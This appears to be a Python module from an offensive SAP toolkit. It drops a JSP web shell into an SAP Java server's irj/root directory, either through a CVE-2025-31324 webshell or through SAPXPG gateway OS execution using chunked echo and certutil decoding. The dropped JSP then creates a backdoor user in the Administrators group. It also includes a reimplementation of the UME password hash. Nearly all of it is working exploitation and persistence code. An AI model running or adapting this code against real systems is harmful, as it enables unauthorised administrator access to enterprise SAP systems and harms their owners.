#!/usr/bin/env python3
"""
SAP UME (Java) user creation — both the password-hash primitive and the
JSP-based user-creation workflow.

Two independent exploit paths are supported, both ending at the same JSP that
uses `com.sap.security.api.UMFactory` via reflection:

  1. CVE-2025-31324: drop the JSP via the existing deserialisation webshell.
  2. GW RFC SAPXPG OS exec: write the JSP in chunked base64 via SAPXPG, then
     decode with `certutil.exe -decode` into the Java cluster's `irj/root/`.

The password hash is reimplemented locally (matches the server's
`com.sap.security.core.util.imp.PasswordHash` output) so hashes are portable
across SAP Java systems — the hash depends only on password+salt+iterations,
never on user or SID.
"""

from __future__ import annotations

import base64
import hashlib
import logging
import os
import random
import re
import secrets
import ssl
import string
import urllib.error
import urllib.parse
import urllib.request

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Password hash — local reimplementation of PasswordHash.hashWithIterations
# ---------------------------------------------------------------------------

def ume_password_hash(password: str,
                       salt: bytes = None,
                       algorithm: str = "SHA-256",
                       iterations: int = 10000,
                       salt_length: int = 24) -> str:
    """Return the UME-formatted password hash string `{ALG, ITER, SLEN}<b64>`.

    The algorithm is SHA-N applied to `password + previous_digest` (NOT
    `salt + previous_digest` like most PBKDF-style iterations).  Initial
    digest is SHA-N(password + salt).  Stored as base64(digest || salt).

    Args:
        password:    plaintext password
        salt:        explicit salt bytes (default: fresh random of salt_length)
        algorithm:   "SHA-256" or "SHA-512"
        iterations:  hash iterations (default matches SAP UME default: 10000)
        salt_length: random salt length in bytes (default 24)

    Returns a string like `{SHA-256, 10000, 24}<base64>` accepted by
    `UACC.PRIVATE_DATASOURCE.un:<user>` rows under the `j_password` attr.
    """
    if salt is None:
        salt = secrets.token_bytes(salt_length)

    pyname = algorithm.lower().replace("-", "")  # sha256 / sha512
    pwd_bytes = password.encode("utf-8")
    digest = hashlib.new(pyname, pwd_bytes + salt).digest()
    for _ in range(iterations - 1):
        digest = hashlib.new(pyname, pwd_bytes + digest).digest()

    encoded = base64.b64encode(digest + salt).decode("ascii")
    return f"{{{algorithm}, {iterations}, {len(salt)}}}{encoded}"


def ume_password_check(hash_str: str, password: str) -> bool:
    """Validate a plaintext password against a stored `{ALG,ITER,SLEN}<b64>` hash."""
    m = re.match(r"^\{([A-Za-z0-9\-]+)\s*,\s*(\d+)\s*,\s*(\d+)\}(.+)$", hash_str)
    if not m:
        return False
    algorithm = m.group(1)
    iterations = int(m.group(2))
    salt_length = int(m.group(3))
    blob = base64.b64decode(m.group(4))
    # blob layout: hash || salt.  Hash length = digest size of algorithm.
    try:
        digest_len = hashlib.new(algorithm.lower().replace("-", "")).digest_size
    except ValueError:
        return False
    stored_hash = blob[:digest_len]
    salt = blob[digest_len:digest_len + salt_length]
    recomputed = ume_password_hash(password, salt, algorithm, iterations, salt_length)
    # Compare raw hashes (constant time)
    expected = base64.b64decode(recomputed.split("}", 1)[1])[:digest_len]
    return secrets.compare_digest(expected, stored_hash)


# ---------------------------------------------------------------------------
# Create-user JSP template (uses UME API via reflection)
# ---------------------------------------------------------------------------

# Request params: user, pass, firstname, lastname, group (default: Administrators).
# Output is a simple `key=value` format so the caller can parse deterministically.
UME_CREATE_JSP = r'''<%@ page contentType="text/plain" %>
<%
String uname     = request.getParameter("user");
String pass      = request.getParameter("pass");
String firstname = request.getParameter("firstname");
String lastname  = request.getParameter("lastname");
String group     = request.getParameter("group");
if (uname == null || uname.length() == 0) {
    out.println("status=error"); out.println("error=missing-user"); return;
}
if (pass == null)      pass = "";
if (firstname == null) firstname = "SAPMAP";
if (lastname == null)  lastname = uname;
if (group == null)     group = "Administrators";

try {
    Class<?> UMF = Class.forName("com.sap.security.api.UMFactory");
    Object uaf = UMF.getMethod("getUserAccountFactory").invoke(null);
    Object uf  = UMF.getMethod("getUserFactory").invoke(null);
    Object gf  = UMF.getMethod("getGroupFactory").invoke(null);

    // Already exists?
    String userId = null;
    try {
        Object existing = uf.getClass()
            .getMethod("getUserByUniqueName", String.class).invoke(uf, uname);
        if (existing != null) {
            userId = (String) existing.getClass()
                .getMethod("getUniqueID").invoke(existing);
            out.println("status=exists");
            out.println("userid=" + userId);
        }
    } catch (java.lang.reflect.InvocationTargetException ite) {
        // NoSuchUserException -> fall through to create
    }

    if (userId == null) {
        Object userMaint = uf.getClass()
            .getMethod("newUser", String.class).invoke(uf, uname);
        userMaint.getClass().getMethod("setFirstName", String.class)
            .invoke(userMaint, firstname);
        userMaint.getClass().getMethod("setLastName", String.class)
            .invoke(userMaint, lastname);

        Object account = uaf.getClass()
            .getMethod("newUserAccount", String.class).invoke(uaf, uname);
        account.getClass().getMethod("setPassword", String.class)
            .invoke(account, pass);

        java.lang.reflect.Method commitUser = null;
        for (java.lang.reflect.Method m : uf.getClass().getMethods()) {
            if (m.getName().equals("commitUser") && m.getParameterTypes().length == 2) {
                commitUser = m; break;
            }
        }
        commitUser.invoke(uf, userMaint, account);
        userId = (String) userMaint.getClass()
            .getMethod("getUniqueID").invoke(userMaint);
        out.println("status=created");
        out.println("userid=" + userId);
    }

    // Add to group (idempotent — addUserToGroup on an existing member is a no-op)
    try {
        Object grp = gf.getClass()
            .getMethod("getGroupByUniqueName", String.class).invoke(gf, group);
        String groupId = (String) grp.getClass()
            .getMethod("getUniqueID").invoke(grp);
        gf.getClass().getMethod("addUserToGroup", String.class, String.class)
            .invoke(gf, userId, groupId);
        out.println("group=" + group);
        out.println("groupid=" + groupId);
    } catch (Throwable gt) {
        Throwable gc = gt;
        while (gc.getCause() != null) gc = gc.getCause();
        out.println("group_error=" + gc.getClass().getSimpleName() + ": " + gc.getMessage());
    }
} catch (Throwable t) {
    Throwable c = t;
    while (c.getCause() != null) c = c.getCause();
    out.println("status=error");
    out.println("error=" + c.getClass().getSimpleName() + ": " + c.getMessage());
}
%>'''


_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
       "AppleWebKit/537.36 (KHTML, like Gecko)")


def _random_jsp_name(prefix: str = "ume") -> str:
    suffix = "".join(random.choice(string.ascii_lowercase) for _ in range(6))
    return f"{prefix}{suffix}.jsp"


def _java_root_path(sid: str, instance_nr: int) -> str:
    """Canonical Windows path of the `irj/root/` web-app directory."""
    return (f"C:\\usr\\sap\\{sid}\\J{int(instance_nr):02d}\\j2ee\\cluster\\apps\\"
            f"sap.com\\irj\\servlet_jsp\\irj\\root")


# ---------------------------------------------------------------------------
# JSP invocation (common to both deployment paths)
# ---------------------------------------------------------------------------

def invoke_create_user_jsp(jsp_url: str, username: str, password: str,
                             firstname: str = "SAPMAP", lastname: str = None,
                             group: str = "Administrators",
                             timeout: float = 25.0) -> dict:
    """Call the deployed create-user JSP and parse the key=value response.

    Returns dict with keys: success, status, userid, group, groupid, error.
    """
    params = {"user": username, "pass": password, "firstname": firstname,
              "lastname": lastname or username, "group": group}
    qs = urllib.parse.urlencode(params)
    url = f"{jsp_url}?{qs}"
    ctx = ssl._create_unverified_context()
    req = urllib.request.Request(url, headers={"User-Agent": _UA})
    result = {"success": False, "status": "", "userid": "",
              "group": "", "groupid": "", "error": "", "raw": ""}
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            text = r.read().decode("latin1", errors="replace")
    except urllib.error.HTTPError as e:
        try:
            text = e.read().decode("latin1", errors="replace")
        except Exception:
            text = ""
        result["error"] = f"HTTP {e.code}"
        result["raw"] = text[:500]
        return result
    except (urllib.error.URLError, TimeoutError, OSError) as e:
        result["error"] = str(e)
        return result

    result["raw"] = text
    for line in text.splitlines():
        if "=" not in line:
            continue
        k, v = line.split("=", 1)
        k = k.strip().lower()
        v = v.strip()
        if k in result:
            result[k] = v
    result["success"] = result["status"] in ("created", "exists")
    return result


# ---------------------------------------------------------------------------
# Deployment path 1: via CVE-2025-31324 (existing dropshell)
# ---------------------------------------------------------------------------

def deploy_create_user_jsp_via_cve_31324(node, writer_fn) -> dict:
    """Drop the create-user JSP via CVE-2025-31324 command-write.

    `writer_fn` is a callable that takes a single shell-command string and
    executes it on the target (typically
    `sapmap_exploit.execute_cve_2025_31324_via_shell` or a wrapper).

    Returns dict: {success, jsp_url, jsp_name, error}.
    """
    sid = node.sid
    port = getattr(node, "cve_2025_31324_port", 0)
    if not port or port < 50000:
        return {"success": False, "error": "no Java HTTP port known"}
    inst_nr = (port - 50000) // 100
    jsp_name = _random_jsp_name("ume")
    target_path = _java_root_path(sid, inst_nr) + "\\" + jsp_name
    jsp_b64 = base64.b64encode(UME_CREATE_JSP.encode("utf-8")).decode("ascii")

    ps_cmd = (f"[IO.File]::WriteAllBytes('{target_path}',"
              f"[Convert]::FromBase64String('{jsp_b64}'))")
    full = f"powershell.exe -NoProfile -Command {ps_cmd}"
    try:
        r = writer_fn(full)
    except Exception as e:
        return {"success": False, "error": f"writer failed: {e}"}
    if not r.get("success"):
        return {"success": False, "error": r.get("error", "write failed")}

    scheme = "https" if getattr(node, "cve_2025_31324_https", False) else "http"
    host = node.ip or node.hostname
    jsp_url = f"{scheme}://{host}:{port}/irj/{jsp_name}"
    return {"success": True, "jsp_url": jsp_url, "jsp_name": jsp_name,
            "target_path": target_path, "method": "cve_31324"}


# ---------------------------------------------------------------------------
# Deployment path 2: via GW RFC SAPXPG OS exec (chunked)
# ---------------------------------------------------------------------------

def deploy_create_user_jsp_via_gw(node, exec_fn, java_instance_nr: int,
                                    chunk_size: int = 100) -> dict:
    """Drop the create-user JSP via SAPXPG gateway OS exec.

    Gateway SAPXPG has 128-byte EXTPROG / 255-byte PARAMS limits, so a
    ~3 KB JSP must be written in chunks.  We base64-encode the JSP, stream
    chunks to `%TEMP%\\sapmap_ume.b64` with `cmd.exe /C echo ...`, then call
    `certutil -decode` to decode into `irj\\root\\<name>.jsp`.

    `exec_fn` is a callable that takes `(command, params)` and runs them
    through `sapmap_exploit.execute_gw_command`.  Returns the same dict
    shape as the CVE path.
    """
    sid = node.sid
    jsp_name = _random_jsp_name("ume")
    target_path = _java_root_path(sid, java_instance_nr) + "\\" + jsp_name
    tmp_b64 = r"%TEMP%\sapmap_ume.b64"

    jsp_b64 = base64.b64encode(UME_CREATE_JSP.encode("utf-8")).decode("ascii")
    chunks = [jsp_b64[i:i + chunk_size]
              for i in range(0, len(jsp_b64), chunk_size)]

    # 0) Clean up any prior leftover
    try:
        exec_fn("cmd.exe", f"/C del /q {tmp_b64} 2>nul")
    except Exception:
        pass

    # 1) Stream base64 chunks
    for idx, chunk in enumerate(chunks):
        op = ">" if idx == 0 else ">>"
        r = exec_fn("cmd.exe", f"/C echo {chunk}{op}{tmp_b64}")
        if not r.get("success"):
            return {"success": False,
                    "error": f"chunk {idx+1}/{len(chunks)} write failed: "
                             f"{r.get('error', '?')}"}

    # 2) Decode to target JSP.  Wrap in cmd.exe /C so %TEMP% in the source
    #    path expands — certutil invoked directly by SAPXPG doesn't resolve
    #    environment variables and would ERROR_PATH_NOT_FOUND on %TEMP%\....
    r = exec_fn("cmd.exe",
                f'/C certutil.exe -decode {tmp_b64} "{target_path}"')
    if not r.get("success"):
        return {"success": False,
                "error": f"certutil -decode failed: {r.get('error', '?')}"}
    # Verify certutil actually decoded (it returns success exit code even
    # on file errors; stdout lines tell us what really happened)
    out_text = " ".join(r.get("output") or [])
    if "FAILED" in out_text or "ERROR" in out_text.upper():
        return {"success": False,
                "error": f"certutil reported error: {out_text[:200]}"}

    # 3) Clean up the tmp base64 file
    try:
        exec_fn("cmd.exe", f"/C del /q {tmp_b64} 2>nul")
    except Exception:
        pass

    # Determine JSP URL — caller supplies the Java HTTP port
    port = 50000 + java_instance_nr * 100
    host = node.ip or node.hostname
    jsp_url = f"http://{host}:{port}/irj/{jsp_name}"
    return {"success": True, "jsp_url": jsp_url, "jsp_name": jsp_name,
            "target_path": target_path, "method": "gw_os_exec",
            "chunks_written": len(chunks)}
